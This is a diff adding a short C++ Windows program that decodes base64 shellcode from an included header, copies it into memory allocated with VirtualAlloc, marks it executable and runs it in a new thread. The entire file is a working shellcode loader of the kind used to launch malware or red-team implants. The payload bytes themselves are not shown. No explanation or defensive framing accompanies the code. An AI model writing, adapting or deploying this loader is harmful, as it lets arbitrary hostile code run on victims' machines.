@@ -1,0 +1,27 @@
+#include <Windows.h>
+#include <iostream>
+#include <vector>
+
+#include "shellcode.h"
+#include "util.h"
+
+int main(int argc, char** argv) {
+
+	// 	if (fdwReason != DLL_PROCESS_ATTACH)
+	// 		return true;
+
+	std::vector<char> buffer = base64_decode(shellcode, shellcodeLen);
+	int bufferSize = buffer.size();
+
+	LPVOID addressPointer = VirtualAlloc(NULL, bufferSize, 0x3000, 0x40);
+	memcpy(addressPointer, &buffer[0], bufferSize);
+
+	DWORD dummy;
+	::VirtualProtect(addressPointer, bufferSize, PAGE_EXECUTE_READ, &dummy);
+	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);
+
+	WaitForSingleObject(hThread, INFINITE);
+
+	return true;
+}
+
